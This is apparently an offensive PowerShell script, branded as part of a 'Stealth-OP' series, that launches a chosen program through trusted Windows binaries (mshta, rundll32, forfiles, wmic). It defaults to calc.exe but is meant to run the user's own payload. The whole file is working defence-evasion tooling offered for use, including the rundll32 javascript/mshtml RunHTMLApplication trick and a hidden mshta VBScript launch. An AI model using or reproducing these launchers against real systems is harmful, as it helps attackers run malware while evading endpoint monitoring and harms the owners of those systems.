<#
 ┓      ┓       ┓  ┓   
┏┫┏┓┓┏┏┓┃┏┓┏┓┏┓┏┫  ┣┓┓┏
┗┻┗ ┗┛┗ ┗┗┛┣┛┗ ┗┻  ┗┛┗┫
           ┛          ┛
┳┓┏┓┓┏┏┓┏┓┓┏┓          
┃┃ ┫┣┫┣┫┃ ┃┫           
┻┛┗┛┛┗┛┗┗┛┛┗┛  

   _____ _             _ _   _            ____  _____  
  / ____| |           | | | | |          / __ \|  __ \ 
 | (___ | |_ ___  __ _| | |_| |__ ______| |  | | |__) |
  \___ \| __/ _ \/ _` | | __| '_ \______| |  | |  ___/ 
  ____) | ||  __/ (_| | | |_| | | |     | |__| | |     
 |_____/ \__\___|\__,_|_|\__|_| |_|      \____/|_|     
  / ____|         (_)                                  
 | (___   ___ _ __ _  ___  ___                         
  \___ \ / _ \ '__| |/ _ \/ __|                        
  ____) |  __/ |  | |  __/\__ \                        
 |_____/ \___|_|  |_|\___||___/                        
                                                       
                                                       
#>

# Use Exp_Powershell_SpawnProcessCaller.ps1 for best results

param (
    [string]$PayloadPath = "C:\Windows\System32\calc.exe", # Its Actually Path to your program.exe
    [ValidateSet("mshta", "rundll32", "forfiles", "wmic")]
    [string]$LOLBin = "mshta"
)

function Invoke-Mshta {
    Write-Host "[*] Using mshta.exe to spawn $PayloadPath"
    $command = "mshta vbscript:CreateObject(""Wscript.Shell"").Run(""$PayloadPath"",0)(window.close)"
    Start-Process "mshta.exe" -ArgumentList $command
}

function Invoke-Rundll32 {
    Write-Host "[*] Using rundll32.exe to spawn $PayloadPath"
    $command = "javascript:""\\..\mshtml,RunHTMLApplication "";document.write();new ActiveXObject(""WScript.Shell"").Run(""$PayloadPath"")"
    Start-Process "rundll32.exe" -ArgumentList $command
}

function Invoke-ForFiles {
    Write-Host "[*] Using forfiles.exe to spawn $PayloadPath"
    $command = "/p C:\Windows\System32 /m notepad.exe /c ""cmd /c $PayloadPath"""
    Start-Process "forfiles.exe" -ArgumentList $command
}

function Invoke-Wmic {
    Write-Host "[*] Using wmic.exe to spawn $PayloadPath"
    $command = "process call create '$PayloadPath'"
    Start-Process "wmic.exe" -ArgumentList $command
}

switch ($LOLBin) {
    "mshta"     { Invoke-Mshta }
    "rundll32"  { Invoke-Rundll32 }
    "forfiles"  { Invoke-ForFiles }
    "wmic"      { Invoke-Wmic }
    default     { Write-Host "[-] Invalid LOLBin choice." }
}


